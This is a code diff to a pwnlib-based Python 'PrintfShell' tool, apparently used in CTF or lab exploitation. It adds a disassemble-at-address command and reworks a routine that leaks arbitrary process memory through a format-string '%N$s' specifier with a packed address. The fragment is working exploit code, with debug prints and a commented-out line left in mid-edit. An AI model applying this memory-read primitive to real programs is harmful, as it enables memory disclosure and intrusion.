@@ -63,6 +63,11 @@ class PrintfShell(shell.Shell):
         return stack
     
     @Command
+    def disasm_at(self, addr : int):
+        bs = self.read_bytes(addr, 20)
+        print(pwnlib.asm.disasm(bs))
+    
+    @Command
     def read_bytes(self, addr : int, n : int):
         if self.stack_offset is None:
             print("need to set the stack offset `set_offset`")
@@ -71,16 +76,18 @@ class PrintfShell(shell.Shell):
         addr = int(addr,16)
         command = bytes(f"%{self.stack_offset+1}$s", "ascii")
         padn = (8 - len(command) % 8) % 8
-        pad = b"X"*padn
+        pad = b"\x00"*padn
         all_bytes = b""
         offset = 0
         while len(all_bytes) < n:
+            print(hex(addr+offset))
             suffix = pad + pwnlib.util.packing.p64(addr + offset)
             res = self.read_response(command + suffix)
-            res = res[:-len(suffix)]
+            print(res)
+            #res = res[:-len(suffix)]
             res = res + b"\x00"
             all_bytes += res
-            offset += len(all_bytes)
+            offset = len(all_bytes)
         print(all_bytes)
         return all_bytes
 
